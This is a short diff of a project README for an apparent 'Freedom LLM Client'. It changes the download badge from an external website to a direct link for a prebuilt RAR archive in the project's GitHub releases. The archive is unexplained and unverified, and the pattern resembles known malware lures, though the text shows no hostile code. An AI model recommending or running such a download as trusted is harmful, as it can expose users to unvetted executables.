@@ -6,7 +6,7 @@
 
 ![Freedom LLM Client](https://github.com/user-attachments/assets/a02deaf9-b468-4720-be02-06a53f3b8861)
 
-[![Download](https://img.shields.io/badge/🚀_DOWNLOAD-Visit_Website-blue?style=for-the-badge&labelColor=1a1a2e&color=4361ee)](https://zekk.fun)
+[![Download](https://img.shields.io/badge/🚀_DOWNLOAD-From_Releases-blue?style=for-the-badge&labelColor=1a1a2e&color=4361ee)](https://github.com/deftydude/Freedom-LLM/releases/download/Download/FreedomLLM_X86.rar)
 
 </div>
 
